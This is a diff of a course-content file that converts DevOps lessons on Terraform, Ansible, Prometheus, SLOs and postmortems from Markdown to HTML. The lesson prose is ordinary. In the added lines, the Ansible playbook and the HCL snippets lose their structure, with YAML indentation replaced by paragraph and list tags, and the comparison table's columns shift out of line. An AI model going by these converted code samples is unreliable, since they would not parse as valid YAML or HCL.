-3. \`terraform apply\` — make the changes
-4. \`terraform destroy\` — delete everything
+<p><strong>Terraform workflow:</strong></p>
+<ol>
+<li><code>terraform init</code> — download provider plugins</li>
+<li><code>terraform plan</code> — show what will change (add, modify, destroy)</li>
+<li><code>terraform apply</code> — make the changes</li>
+<li><code>terraform destroy</code> — delete everything</li>
+</ol>
 
-**The plan step is critical.** It shows you exactly what will happen before anything changes. Like a "dry run."
+<p><strong>The plan step is critical.</strong> It shows you exactly what will happen before anything changes. Like a "dry run."</p>
 
-**State file:**
-Terraform keeps a state file (terraform.tfstate) that tracks what it created. This is how it knows what exists and what needs to change. Never edit this file by hand.`
+<p><strong>State file:</strong></p>
+<p>Terraform keeps a state file (terraform.tfstate) that tracks what it created. This is how it knows what exists and what needs to change. Never edit this file by hand.</p>`
       },
       {
         titleEn: "Ansible: Configuration Management",
-        contentEn: `Terraform creates servers. Ansible configures them.
+        contentEn: `<p>Terraform creates servers. Ansible configures them.</p>
 
-**What Ansible does:**
-- Install software on 100 servers at once
-- Copy config files to every server
-- Restart services after a config change
-- Ensure all servers are in the same state
+<p><strong>What Ansible does:</strong></p>
+<ul>
+<li>Install software on 100 servers at once</li>
+<li>Copy config files to every server</li>
+<li>Restart services after a config change</li>
+<li>Ensure all servers are in the same state</li>
+</ul>
 
-**How it works:**
-- Agentless: connects via SSH (no software to install on target servers)
-- Playbooks: YAML files that describe the desired state
-- Idempotent: run it 10 times, same result (safe to repeat)
+<p><strong>How it works:</strong></p>
+<ul>
+<li>Agentless: connects via SSH (no software to install on target servers)</li>
+<li>Playbooks: YAML files that describe the desired state</li>
+<li>Idempotent: run it 10 times, same result (safe to repeat)</li>
+</ul>
 
-**Example playbook:**
-\`\`\`yaml
-# setup-web.yml
-- hosts: webservers
-  become: yes
-  tasks:
-    - name: Install nginx
-      apt:
-        name: nginx
-        state: present
+<p><strong>Example playbook:</strong></p>
+<pre><code>yaml
+<p># setup-web.yml</p>
+<ul>
+<li>hosts: webservers</li>
+</ul>
+<p>become: yes</p>
+<p>tasks:</p>
+<ul>
+<li>name: Install nginx</li>
+</ul>
+<p>apt:</p>
+<p>name: nginx</p>
+<p>state: present</p>
 
-    - name: Copy config file
-      copy:
-        src: nginx.conf
-        dest: /etc/nginx/nginx.conf
-      notify: restart nginx
+<ul>
+<li>name: Copy config file</li>
+</ul>
+<p>copy:</p>
+<p>src: nginx.conf</p>
+<p>dest: /etc/nginx/nginx.conf</p>
+<p>notify: restart nginx</p>
 
-    - name: Ensure nginx is running
-      service:
-        name: nginx
-        state: started
-        enabled: yes
+<ul>
+<li>name: Ensure nginx is running</li>
+</ul>
+<p>service:</p>
+<p>name: nginx</p>
+<p>state: started</p>
+<p>enabled: yes</p>
 
-  handlers:
-    - name: restart nginx
-      service:
-        name: nginx
-        state: restarted
-\`\`\`
+<p>handlers:</p>
+<ul>
+<li>name: restart nginx</li>
+</ul>
+<p>service:</p>
+<p>name: nginx</p>
+<p>state: restarted</p>
+</code></pre>
 
-**Terraform vs Ansible:**
-| | Terraform | Ansible |
-|---|---|---|
-| Purpose | Create infrastructure | Configure servers |
-| Language | HCL | YAML |
-| State | Stateful (state file) | Stateless |
-| Best for | Cloud resources | Server setup |
+<p><strong>Terraform vs Ansible:</strong></p>
+<table>
+<thead><tr><th>Terraform</th><th>Ansible</th></tr></thead>
+<tbody>
+<tr><td>Purpose</td><td>Create infrastructure</td><td>Configure servers</td></tr>
+<tr><td>Language</td><td>HCL</td><td>YAML</td></tr>
+<tr><td>State</td><td>Stateful (state file)</td><td>Stateless</td></tr>
+<tr><td>Best for</td><td>Cloud resources</td><td>Server setup</td></tr>
+</tbody></table>
 
-**They work together:** Terraform creates 10 EC2 instances → Ansible installs and configures your app on all 10.
+<p><strong>They work together:</strong> Terraform creates 10 EC2 instances → Ansible installs and configures your app on all 10.</p>
 
 {simulation}
-You need to set up a production environment:
-1. Terraform creates: VPC, 3 EC2 instances, RDS database, S3 bucket
-2. Ansible connects to the 3 EC2 instances and: installs Docker, pulls the app image, starts the container, configures log rotation
-3. GitHub Actions runs on every push: tests → build → push image → Ansible deploys
+<p>You need to set up a production environment:</p>
+<ol>
+<li>Terraform creates: VPC, 3 EC2 instances, RDS database, S3 bucket</li>
+<li>Ansible connects to the 3 EC2 instances and: installs Docker, pulls the app image, starts the container, configures log rotation</li>
+<li>GitHub Actions runs on every push: tests → build → push image → Ansible deploys</li>
+</ol>
 
-This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.`
+<p>This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.</p>`
       }
     ]
   },
@@ -6301,159 +6806,196 @@ This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.`
     pages: [
       {
         titleEn: "The Three Pillars of Observability",
-        contentEn: `Observability means understanding what your system is doing from the outside.
+        contentEn: `<p>Observability means understanding what your system is doing from the outside.</p>
 
-**Three pillars:**
+<p><strong>Three pillars:</strong></p>
 
-**1. Metrics — numbers over time**
-- CPU usage: 45% → 78% → 92%
-- Request count: 1,200 per minute
-- Error rate: 0.3%
-- Response time: p99 = 250ms
-- Metrics answer: "Is something wrong right now?"
+<p><strong>1. Metrics — numbers over time</strong></p>
+<ul>
+<li>CPU usage: 45% → 78% → 92%</li>
+<li>Request count: 1,200 per minute</li>
+<li>Error rate: 0.3%</li>
+<li>Response time: p99 = 250ms</li>
+<li>Metrics answer: "Is something wrong right now?"</li>
+</ul>
 
-**2. Logs — detailed event records**
-- \`2024-03-15 10:23:45 ERROR: Database connection refused\`
-- \`2024-03-15 10:23:46 WARN: Retrying connection (attempt 2/3)\`
-- \`2024-03-15 10:23:47 INFO: Connection restored\`
-- Logs answer: "What exactly happened?"
+<p><strong>2. Logs — detailed event records</strong></p>
+<ul>
+<li><code>2024-03-15 10:23:45 ERROR: Database connection refused</code></li>
+<li><code>2024-03-15 10:23:46 WARN: Retrying connection (attempt 2/3)</code></li>
+<li><code>2024-03-15 10:23:47 INFO: Connection restored</code></li>
+<li>Logs answer: "What exactly happened?"</li>
+</ul>
 
-**3. Traces — follow a request across services**
-- User clicks "Buy" → API gateway → auth service → order service → payment → email
-- Each step has a timing: auth took 12ms, payment took 340ms
-- Traces answer: "Where is the bottleneck?"
+<p><strong>3. Traces — follow a request across services</strong></p>
+<ul>
+<li>User clicks "Buy" → API gateway → auth service → order service → payment → email</li>
+<li>Each step has a timing: auth took 12ms, payment took 340ms</li>
+<li>Traces answer: "Where is the bottleneck?"</li>
+</ul>
 
-**Why all three?**
-- Metric alert: "Error rate jumped to 5%"
-- Logs: "Database connection timeout errors on service-B"
-- Trace: "Requests that hit service-B → database take 8 seconds instead of 50ms"
-- Root cause: the database server ran out of connections
+<p><strong>Why all three?</strong></p>
+<ul>
+<li>Metric alert: "Error rate jumped to 5%"</li>
+<li>Logs: "Database connection timeout errors on service-B"</li>
+<li>Trace: "Requests that hit service-B → database take 8 seconds instead of 50ms"</li>
+<li>Root cause: the database server ran out of connections</li>
+</ul>
 
-One pillar alone cannot solve the puzzle. You need all three.`
+<p>One pillar alone cannot solve the puzzle. You need all three.</p>`
       },
       {
         titleEn: "Prometheus & Grafana",
-        contentEn: `Prometheus collects metrics. Grafana makes them visual.
+        contentEn: `<p>Prometheus collects metrics. Grafana makes them visual.</p>
 
-**Prometheus:**
-- Pull-based: Prometheus asks your app "what are your metrics?" every 15 seconds
-- Your app exposes metrics at /metrics endpoint
-- Time-series database: stores metric values over time
-- Alert rules: "If error_rate > 5% for 5 minutes, alert the team"
+<p><strong>Prometheus:</strong></p>
+<ul>
+<li>Pull-based: Prometheus asks your app "what are your metrics?" every 15 seconds</li>
+<li>Your app exposes metrics at /metrics endpoint</li>
+<li>Time-series database: stores metric values over time</li>
+<li>Alert rules: "If error_rate > 5% for 5 minutes, alert the team"</li>
+</ul>
 
-**How apps expose metrics:**
-\`\`\`
-# GET /metrics
-http_requests_total{method="GET", status="200"} 15234
-http_requests_total{method="POST", status="500"} 12
-http_request_duration_seconds{quantile="0.99"} 0.25
-node_cpu_usage_percent 67.3
-\`\`\`
+<p><strong>How apps expose metrics:</strong></p>
+<pre><code># GET /metrics
+<p>http_requests_total{method="GET", status="200"} 15234</p>
+<p>http_requests_total{method="POST", status="500"} 12</p>
+<p>http_request_duration_seconds{quantile="0.99"} 0.25</p>
+<p>node_cpu_usage_percent 67.3</p>
+</code></pre>
 
-**Grafana:**
-- Connects to Prometheus (and other data sources)
-- Builds dashboards with charts, graphs, and alerts
-- Common panels: time series, gauge, stat, table, heatmap
-- Share dashboards with the team
+<p><strong>Grafana:</strong></p>
+<ul>
+<li>Connects to Prometheus (and other data sources)</li>
+<li>Builds dashboards with charts, graphs, and alerts</li>
+<li>Common panels: time series, gauge, stat, table, heatmap</li>
+<li>Share dashboards with the team</li>
+</ul>
 
-**A typical dashboard shows:**
-- Request rate (requests per second)
-- Error rate (% of 5xx responses)
-- Latency (p50, p95, p99)
-- CPU, memory, disk usage
-- Active database connections
+<p><strong>A typical dashboard shows:</strong></p>
+<ul>
+<li>Request rate (requests per second)</li>
+<li>Error rate (% of 5xx responses)</li>
+<li>Latency (p50, p95, p99)</li>
+<li>CPU, memory, disk usage</li>
+<li>Active database connections</li>
+</ul>
 
-**The RED method (for services):**
-- **R**ate — how many requests per second?
-- **E**rrors — how many of those fail?
-- **D**uration — how long do they take?
+<p><strong>The RED method (for services):</strong></p>
+<ul>
+<li><strong>R</strong>ate — how many requests per second?</li>
+<li><strong>E</strong>rrors — how many of those fail?</li>
+<li><strong>D</strong>uration — how long do they take?</li>
+</ul>
 
 {question}
-Prometheus scrapes metrics every 15 seconds. Your app crashes and restarts in 5 seconds. Will Prometheus notice?
-a) Yes, it checks every 15 seconds so it will see the restart
-b) No, the crash happened between scrapes
-c) It depends on the metrics
-d) Both a and b are possible
+<p>Prometheus scrapes metrics every 15 seconds. Your app crashes and restarts in 5 seconds. Will Prometheus notice?</p>
+<p>a) Yes, it checks every 15 seconds so it will see the restart</p>
+<p>b) No, the crash happened between scrapes</p>
+<p>c) It depends on the metrics</p>
+<p>d) Both a and b are possible</p>
 
-answer: d
-explanation: If Prometheus scrapes right during the crash, it will see a failed scrape (target down). If the app restarts before the next scrape, Prometheus might miss it. This is why logs and traces complement metrics.`
+<p>answer: d</p>
+<p>explanation: If Prometheus scrapes right during the crash, it will see a failed scrape (target down). If the app restarts before the next scrape, Prometheus might miss it. This is why logs and traces complement metrics.</p>`
       },
       {
         titleEn: "SLI, SLO, and SLA",
-        contentEn: `These three terms define reliability in measurable ways.
+        contentEn: `<p>These three terms define reliability in measurable ways.</p>
 
-**SLI (Service Level Indicator):**
-- A metric that measures user experience
-- Examples:
-  - Request latency: p99 = 200ms
-  - Availability: 99.95% of requests succeed
-  - Error rate: 0.1% of requests return 5xx
+<p><strong>SLI (Service Level Indicator):</strong></p>
+<ul>
+<li>A metric that measures user experience</li>
+<li>Examples:</li>
+<li>Request latency: p99 = 200ms</li>
+<li>Availability: 99.95% of requests succeed</li>
+<li>Error rate: 0.1% of requests return 5xx</li>
+</ul>
 
-**SLO (Service Level Objective):**
-- Your internal target for an SLI
-- "99.9% of requests will complete in under 300ms"
-- "99.95% availability per month"
-- This is what your team promises to achieve
+<p><strong>SLO (Service Level Objective):</strong></p>
+<ul>
+<li>Your internal target for an SLI</li>
+<li>"99.9% of requests will complete in under 300ms"</li>
+<li>"99.95% availability per month"</li>
+<li>This is what your team promises to achieve</li>
+</ul>
 
-**SLA (Service Level Agreement):**
-- A contract with customers
-- Includes consequences: "If we drop below 99.9% uptime, we give you a credit"
-- SLA is always less strict than SLO (you need a safety margin)
+<p><strong>SLA (Service Level Agreement):</strong></p>
+<ul>
+<li>A contract with customers</li>
+<li>Includes consequences: "If we drop below 99.9% uptime, we give you a credit"</li>
+<li>SLA is always less strict than SLO (you need a safety margin)</li>
+</ul>
 
-**Example:**
-- SLI: actual uptime last month = 99.97%
-- SLO: internal goal = 99.95%
-- SLA: contract with customers = 99.9%
+<p><strong>Example:</strong></p>
+<ul>
+<li>SLI: actual uptime last month = 99.97%</li>
+<li>SLO: internal goal = 99.95%</li>
+<li>SLA: contract with customers = 99.9%</li>
+</ul>
 
-**Error budget:**
-- SLO = 99.9% → you can have 0.1% downtime per month
-- 0.1% of 30 days = 43 minutes of allowed downtime
-- If you still have error budget left → deploy new features
-- If error budget is used up → freeze releases, focus on reliability
+<p><strong>Error budget:</strong></p>
+<ul>
+<li>SLO = 99.9% → you can have 0.1% downtime per month</li>
+<li>0.1% of 30 days = 43 minutes of allowed downtime</li>
+<li>If you still have error budget left → deploy new features</li>
+<li>If error budget is used up → freeze releases, focus on reliability</li>
+</ul>
 
-**The key insight:** 100% is not the goal. If you have zero downtime, you are probably not releasing fast enough. The error budget balances speed and reliability.`
+<p><strong>The key insight:</strong> 100% is not the goal. If you have zero downtime, you are probably not releasing fast enough. The error budget balances speed and reliability.</p>`
       },
       {
         titleEn: "ELK Stack & Postmortem Culture",
-        contentEn: `**ELK Stack — centralized logging:**
+        contentEn: `<p><strong>ELK Stack — centralized logging:</strong></p>
 
-- **E**lasticsearch — stores and indexes logs (search engine)
-- **L**ogstash — collects, transforms, and ships logs
-- **K**ibana — visualize and search logs in a web UI
+<ul>
+<li><strong>E</strong>lasticsearch — stores and indexes logs (search engine)</li>
+<li><strong>L</strong>ogstash — collects, transforms, and ships logs</li>
+<li><strong>K</strong>ibana — visualize and search logs in a web UI</li>
+</ul>
 
-**How it works:**
-1. Your apps write logs (stdout, files)
-2. A log shipper (Filebeat) sends them to Logstash
-3. Logstash parses and enriches the logs
-4. Elasticsearch stores them (searchable)
-5. Kibana lets you search: "show all errors from payment-service in the last hour"
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Your apps write logs (stdout, files)</li>
+<li>A log shipper (Filebeat) sends them to Logstash</li>
+<li>Logstash parses and enriches the logs</li>
+<li>Elasticsearch stores them (searchable)</li>
+<li>Kibana lets you search: "show all errors from payment-service in the last hour"</li>
+</ol>
 
-**Why centralized logging?**
-- 50 servers × 10 log files = 500 files to search manually
-- ELK: one search bar to find any log from any server
+<p><strong>Why centralized logging?</strong></p>
+<ul>
+<li>50 servers × 10 log files = 500 files to search manually</li>
+<li>ELK: one search bar to find any log from any server</li>
+</ul>
 
-**Postmortem culture:**
-When something breaks, you write a postmortem — a document that asks:
-1. **What happened?** (timeline of events)
-2. **What was the impact?** (users affected, duration)
-3. **Why did it happen?** (root cause, not blame)
-4. **How did we detect it?** (monitoring? customer complaint?)
-5. **What will we do to prevent it?** (action items with owners and deadlines)
+<p><strong>Postmortem culture:</strong></p>
+<p>When something breaks, you write a postmortem — a document that asks:</p>
+<ol>
+<li><strong>What happened?</strong> (timeline of events)</li>
+<li><strong>What was the impact?</strong> (users affected, duration)</li>
+<li><strong>Why did it happen?</strong> (root cause, not blame)</li>
+<li><strong>How did we detect it?</strong> (monitoring? customer complaint?)</li>
+<li><strong>What will we do to prevent it?</strong> (action items with owners and deadlines)</li>
+</ol>
 
-**Rules of a good postmortem:**
-- Blameless: "The deploy script had no rollback" NOT "John deployed bad code"
-- Focused on systems: "How do we make this impossible?" not "Who made the mistake?"
-- Shared publicly within the company → everyone learns
+<p><strong>Rules of a good postmortem:</strong></p>
+<ul>
+<li>Blameless: "The deploy script had no rollback" NOT "John deployed bad code"</li>
+<li>Focused on systems: "How do we make this impossible?" not "Who made the mistake?"</li>
+<li>Shared publicly within the company → everyone learns</li>
+</ul>
 
 {thinkOutside}
-Your payment service was down for 45 minutes last night. The on-call engineer fixed it by restarting the database. The CEO asks: "Who is responsible?"
+<p>Your payment service was down for 45 minutes last night. The on-call engineer fixed it by restarting the database. The CEO asks: "Who is responsible?"</p>
 
-How would you run a blameless postmortem?
+<p>How would you run a blameless postmortem?</p>
 
-Key approach:
-- Focus on: "Why did the database need restarting? What caused the state that led to the crash?"
-- Not: "Who forgot to check the database?"
-- Action items: add database connection pool monitoring, add auto-restart on high connection count, improve the runbook for database issues`
+<p>Key approach:</p>
+<ul>
+<li>Focus on: "Why did the database need restarting? What caused the state that led to the crash?"</li>
+<li>Not: "Who forgot to check the database?"</li>
+<li>Action items: add database connection pool monitoring, add auto-restart on high connection count, improve the runbook for database issues</li>
+</ul>`
       }
     ]
   },
@@ -6463,181 +7005,209 @@ Key approach:
     pages: [
       {
         titleEn: "What is Infrastructure as Code?",
-        contentEn: `IaC means managing servers, networks, and services through code files instead of manual clicks.
+        contentEn: `<p>IaC means managing servers, networks, and services through code files instead of manual clicks.</p>
 
-**The problem (before IaC):**
-- An engineer clicks through the AWS console to create a server
-- Nobody knows exactly what settings were used
-- Creating a second identical server? Good luck remembering every click
-- "Snowflake servers" — each one is slightly different
+<p><strong>The problem (before IaC):</strong></p>
+<ul>
+<li>An engineer clicks through the AWS console to create a server</li>
+<li>Nobody knows exactly what settings were used</li>
+<li>Creating a second identical server? Good luck remembering every click</li>
+<li>"Snowflake servers" — each one is slightly different</li>
+</ul>
 
-**The IaC solution:**
-- Write code that describes your infrastructure
-- Store the code in Git (version history, reviews, rollbacks)
-- Run the code → infrastructure is created exactly the same every time
+<p><strong>The IaC solution:</strong></p>
+<ul>
+<li>Write code that describes your infrastructure</li>
+<li>Store the code in Git (version history, reviews, rollbacks)</li>
+<li>Run the code → infrastructure is created exactly the same every time</li>
+</ul>
 
-**Benefits:**
-- **Reproducible** — dev, staging, and production are identical
-- **Auditable** — git log shows every change and who made it
-- **Fast** — create 100 servers in minutes
-- **Self-documenting** — the code IS the documentation
-- **Testable** — validate infrastructure before applying changes
+<p><strong>Benefits:</strong></p>
+<ul>
+<li><strong>Reproducible</strong> — dev, staging, and production are identical</li>
+<li><strong>Auditable</strong> — git log shows every change and who made it</li>
+<li><strong>Fast</strong> — create 100 servers in minutes</li>
+<li><strong>Self-documenting</strong> — the code IS the documentation</li>
+<li><strong>Testable</strong> — validate infrastructure before applying changes</li>
+</ul>
 
-**Types of IaC tools:**
-| Tool | Type | Use |
-|---|---|---|
-| Terraform | Provisioning | Create cloud resources |
-| CloudFormation | Provisioning | AWS-only, same idea |
-| Ansible | Configuration | Set up software on servers |
-| Pulumi | Provisioning | IaC in real programming languages |
+<p><strong>Types of IaC tools:</strong></p>
+<table>
+<thead><tr><th>Tool</th><th>Type</th><th>Use</th></tr></thead>
+<tbody>
+<tr><td>Terraform</td><td>Provisioning</td><td>Create cloud resources</td></tr>
+<tr><td>CloudFormation</td><td>Provisioning</td><td>AWS-only, same idea</td></tr>
+<tr><td>Ansible</td><td>Configuration</td><td>Set up software on servers</td></tr>
+<tr><td>Pulumi</td><td>Provisioning</td><td>IaC in real programming languages</td></tr>
+</tbody></table>
 
-**Key principle:** Never make changes by hand. If it is not in the code, it does not exist.`
+<p><strong>Key principle:</strong> Never make changes by hand. If it is not in the code, it does not exist.</p>`
       },
       {
         titleEn: "Terraform HCL Language",
-        contentEn: `HCL (HashiCorp Configuration Language) is Terraform's language. It is declarative — you describe what you want, not how to build it.
+        contentEn: `<p>HCL (HashiCorp Configuration Language) is Terraform's language. It is declarative — you describe what you want, not how to build it.</p>
 
-**Core building blocks:**
+<p><strong>Core building blocks:</strong></p>
 
-**Provider** — which cloud to use:
-\`\`\`hcl
-provider "aws" {
-  region = "us-east-1"
-}
-\`\`\`
+<p><strong>Provider</strong> — which cloud to use:</p>
+<pre><code>hcl
+<p>provider "aws" {</p>
+<p>region = "us-east-1"</p>
+<p>}</p>
+</code></pre>
 
-**Resource** — something to create:
-\`\`\`hcl
-resource "aws_instance" "web" {
-  ami           = "ami-0c55b159cbfafe1f0"
-  instance_type = "t3.micro"
-  subnet_id     = aws_subnet.public.id
-}
-\`\`\`
+<p><strong>Resource</strong> — something to create:</p>
+<pre><code>hcl
+<p>resource "aws_instance" "web" {</p>
+<p>ami           = "ami-0c55b159cbfafe1f0"</p>
+<p>instance_type = "t3.micro"</p>
+<p>subnet_id     = aws_subnet.public.id</p>
+<p>}</p>
+</code></pre>
 
-**Variable** — input parameters:
-\`\`\`hcl
-variable "instance_count" {
-  type    = number
-  default = 2
-}
-\`\`\`
+<p><strong>Variable</strong> — input parameters:</p>
+<pre><code>hcl
+<p>variable "instance_count" {</p>
+<p>type    = number</p>
+<p>default = 2</p>
+<p>}</p>
+</code></pre>
 
-**Output** — values to show after apply:
-\`\`\`hcl
-output "server_ip" {
-  value = aws_instance.web.public_ip
-}
-\`\`\`
+<p><strong>Output</strong> — values to show after apply:</p>
+<pre><code>hcl
+<p>output "server_ip" {</p>
+<p>value = aws_instance.web.public_ip</p>
+<p>}</p>
+</code></pre>
 
-**Data source** — read existing resources:
-\`\`\`hcl
-data "aws_ami" "ubuntu" {
-  most_recent = true
-  filter {
-    name   = "name"
-    values = ["ubuntu/images/hvm-ssd/ubuntu-22*"]
-  }
-}
-\`\`\`
+<p><strong>Data source</strong> — read existing resources:</p>
+<pre><code>hcl
+<p>data "aws_ami" "ubuntu" {</p>
+<p>most_recent = true</p>
+<p>filter {</p>
+<p>name   = "name"</p>
+<p>values = ["ubuntu/images/hvm-ssd/ubuntu-22*"]</p>
+<p>}</p>
+<p>}</p>
+</code></pre>
 
-**References:**
-- \`aws_subnet.public.id\` — reference another resource's attribute
-- \`var.instance_count\` — reference a variable
-- \`data.aws_ami.ubuntu.id\` — reference a data source
+<p><strong>References:</strong></p>
+<ul>
+<li><code>aws_subnet.public.id</code> — reference another resource's attribute</li>
+<li><code>var.instance_count</code> — reference a variable</li>
+<li><code>data.aws_ami.ubuntu.id</code> — reference a data source</li>
+</ul>
 
 {question}
-What does \`aws_instance.web.public_ip\` mean in Terraform?
-a) A hardcoded IP address
-b) The public IP of the resource named "web" of type "aws_instance"
-c) A variable named public_ip
-d) An AWS API call
+<p>What does <code>aws_instance.web.public_ip</code> mean in Terraform?</p>
+<p>a) A hardcoded IP address</p>
+<p>b) The public IP of the resource named "web" of type "aws_instance"</p>
+<p>c) A variable named public_ip</p>
+<p>d) An AWS API call</p>
 
-answer: b
-explanation: Terraform creates a resource graph. \`aws_instance.web\` refers to the resource block, and \`.public_ip\` is an attribute that AWS returns after the instance is created.`
+<p>answer: b</p>
+<p>explanation: Terraform creates a resource graph. <code>aws_instance.web</code> refers to the resource block, and <code>.public_ip</code> is an attribute that AWS returns after the instance is created.</p>`
       },
       {
         titleEn: "Terraform State Management",
-        contentEn: `State is Terraform's memory. It tracks what resources exist and their current configuration.
+        contentEn: `<p>State is Terraform's memory. It tracks what resources exist and their current configuration.</p>
 
-**What the state file contains:**
-- Every resource Terraform created
-- Their IDs, IPs, and settings
-- The mapping between your code and the real world
+<p><strong>What the state file contains:</strong></p>
+<ul>
+<li>Every resource Terraform created</li>
+<li>Their IDs, IPs, and settings</li>
+<li>The mapping between your code and the real world</li>
+</ul>
 
-**Local state (default):**
-- Saved as \`terraform.tfstate\` in your project folder
-- Problem: only one person can use it at a time
-- Problem: if you lose the file, Terraform forgets everything
+<p><strong>Local state (default):</strong></p>
+<ul>
+<li>Saved as <code>terraform.tfstate</code> in your project folder</li>
+<li>Problem: only one person can use it at a time</li>
+<li>Problem: if you lose the file, Terraform forgets everything</li>
+</ul>
 
-**Remote state (production):**
-\`\`\`hcl
-terraform {
-  backend "s3" {
-    bucket         = "my-terraform-state"
-    key            = "prod/terraform.tfstate"
-    region         = "us-east-1"
-    dynamodb_table = "terraform-locks"
-    encrypt        = true
-  }
-}
-\`\`\`
+<p><strong>Remote state (production):</strong></p>
+<pre><code>hcl
+<p>terraform {</p>
+<p>backend "s3" {</p>
+<p>bucket         = "my-terraform-state"</p>
+<p>key            = "prod/terraform.tfstate"</p>
+<p>region         = "us-east-1"</p>
+<p>dynamodb_table = "terraform-locks"</p>
+<p>encrypt        = true</p>
+<p>}</p>
+<p>}</p>
+</code></pre>
 
-**Why remote state?**
-- **Shared access** — the whole team uses the same state
-- **Locking** — DynamoDB prevents two people from changing infra at the same time
-- **Encryption** — state can contain secrets (passwords, keys)
-- **Backup** — S3 has versioning, so you can recover old state
+<p><strong>Why remote state?</strong></p>
+<ul>
+<li><strong>Shared access</strong> — the whole team uses the same state</li>
+<li><strong>Locking</strong> — DynamoDB prevents two people from changing infra at the same time</li>
+<li><strong>Encryption</strong> — state can contain secrets (passwords, keys)</li>
+<li><strong>Backup</strong> — S3 has versioning, so you can recover old state</li>
+</ul>
 
-**State commands:**
-- \`terraform state list\` — show all tracked resources
-- \`terraform state show aws_instance.web\` — show details of one resource
-- \`terraform import aws_instance.web i-1234567\` — import an existing resource into state
+<p><strong>State commands:</strong></p>
+<ul>
+<li><code>terraform state list</code> — show all tracked resources</li>
+<li><code>terraform state show aws_instance.web</code> — show details of one resource</li>
+<li><code>terraform import aws_instance.web i-1234567</code> — import an existing resource into state</li>
+</ul>
 
-**Golden rule:** Never edit the state file manually. Use \`terraform state\` commands or \`terraform import\`.`
+<p><strong>Golden rule:</strong> Never edit the state file manually. Use <code>terraform state</code> commands or <code>terraform import</code>.</p>`
       },
       {
         titleEn: "Cattle vs Pets",
-        contentEn: `This is the most important mental shift in DevOps.
+        contentEn: `<p>This is the most important mental shift in DevOps.</p>
 
-**Pets (the old way):**
-- Each server has a name: "db-master", "web-prod-01"
-- You log in to fix problems manually
-- If a server dies, you panic and try to repair it
-- Servers are unique and irreplaceable
-- Like a pet: you name it, care for it, and cry when it is sick
+<p><strong>Pets (the old way):</strong></p>
+<ul>
+<li>Each server has a name: "db-master", "web-prod-01"</li>
+<li>You log in to fix problems manually</li>
+<li>If a server dies, you panic and try to repair it</li>
+<li>Servers are unique and irreplaceable</li>
+<li>Like a pet: you name it, care for it, and cry when it is sick</li>
+</ul>
 
-**Cattle (the DevOps way):**
-- Servers are numbered: instance-001, instance-002
-- You never log in to fix anything — you replace the server
-- If a server dies, automation creates a new one in seconds
-- Servers are identical and disposable
-- Like cattle: any one can be replaced by another
+<p><strong>Cattle (the DevOps way):</strong></p>
+<ul>
+<li>Servers are numbered: instance-001, instance-002</li>
+<li>You never log in to fix anything — you replace the server</li>
+<li>If a server dies, automation creates a new one in seconds</li>
+<li>Servers are identical and disposable</li>
+<li>Like cattle: any one can be replaced by another</li>
+</ul>
 
-**How to treat servers as cattle:**
-1. **IaC** — create any server from code in minutes
-2. **Immutable infrastructure** — never update a server, deploy a new one
-3. **Configuration management** — Ansible ensures all servers are identical
-4. **Auto Scaling** — automatically add or remove servers
-5. **Health checks** — kill unhealthy servers, create healthy ones
+<p><strong>How to treat servers as cattle:</strong></p>
+<ol>
+<li><strong>IaC</strong> — create any server from code in minutes</li>
+<li><strong>Immutable infrastructure</strong> — never update a server, deploy a new one</li>
+<li><strong>Configuration management</strong> — Ansible ensures all servers are identical</li>
+<li><strong>Auto Scaling</strong> — automatically add or remove servers</li>
+<li><strong>Health checks</strong> — kill unhealthy servers, create healthy ones</li>
+</ol>
 
-**Story: The Production Database Server**
-A company had one database server called "Big Bertha." It ran for 4 years. Nobody dared restart it. Nobody knew exactly how it was configured. When it finally crashed, recovery took 3 days.
+<p><strong>Story: The Production Database Server</strong></p>
+<p>A company had one database server called "Big Bertha." It ran for 4 years. Nobody dared restart it. Nobody knew exactly how it was configured. When it finally crashed, recovery took 3 days.</p>
 
-After the incident, they:
-- Automated the database setup with Terraform + Ansible
-- Set up RDS Multi-AZ (managed database with auto-failover)
-- Tested failover every month
+<p>After the incident, they:</p>
+<ul>
+<li>Automated the database setup with Terraform + Ansible</li>
+<li>Set up RDS Multi-AZ (managed database with auto-failover)</li>
+<li>Tested failover every month</li>
+</ul>
 
-Now their database is cattle. If it dies, AWS creates a new one in 60 seconds.
+<p>Now their database is cattle. If it dies, AWS creates a new one in 60 seconds.</p>
 
 {thinkOutside}
-Look at your own projects. Which of your servers or services are "pets"? How would you turn them into "cattle"?
+<p>Look at your own projects. Which of your servers or services are "pets"? How would you turn them into "cattle"?</p>
 
-Think about:
-- Can you recreate the server from scratch in under 10 minutes?
-- Is every configuration step documented in code?
-- Would you be comfortable if someone deleted the server right now?`
+<p>Think about:</p>
+<ul>
+<li>Can you recreate the server from scratch in under 10 minutes?</li>
+<li>Is every configuration step documented in code?</li>
+<li>Would you be comfortable if someone deleted the server right now?</li>
+</ul>`
       }
     ]
   },
@@ -6647,189 +7217,219 @@ Think about:
     pages: [
       {
         titleEn: "The Metrics-Logs-Traces Triangle",
-        contentEn: `Each pillar of observability serves a different purpose in debugging.
+        contentEn: `<p>Each pillar of observability serves a different purpose in debugging.</p>
 
-**Metrics — the alert system**
-- Aggregate numbers: averages, percentiles, counts
-- Cheap to store (just numbers over time)
-- Good for: dashboards, alerts, capacity planning
-- Weakness: tells you THAT something is wrong, not WHY
+<p><strong>Metrics — the alert system</strong></p>
+<ul>
+<li>Aggregate numbers: averages, percentiles, counts</li>
+<li>Cheap to store (just numbers over time)</li>
+<li>Good for: dashboards, alerts, capacity planning</li>
+<li>Weakness: tells you THAT something is wrong, not WHY</li>
+</ul>
 
-**Logs — the detail system**
-- Text records of events with timestamps
-- Expensive to store (text is large)
-- Good for: debugging specific errors, audit trails
-- Weakness: hard to see patterns across millions of log lines
+<p><strong>Logs — the detail system</strong></p>
+<ul>
+<li>Text records of events with timestamps</li>
+<li>Expensive to store (text is large)</li>
+<li>Good for: debugging specific errors, audit trails</li>
+<li>Weakness: hard to see patterns across millions of log lines</li>
+</ul>
 
-**Traces — the flow system**
-- Follow one request across multiple services
-- Medium cost to store
-- Good for: finding slow services, understanding dependencies
-- Weakness: sampling needed at high traffic (you cannot trace every request)
+<p><strong>Traces — the flow system</strong></p>
+<ul>
+<li>Follow one request across multiple services</li>
+<li>Medium cost to store</li>
+<li>Good for: finding slow services, understanding dependencies</li>
+<li>Weakness: sampling needed at high traffic (you cannot trace every request)</li>
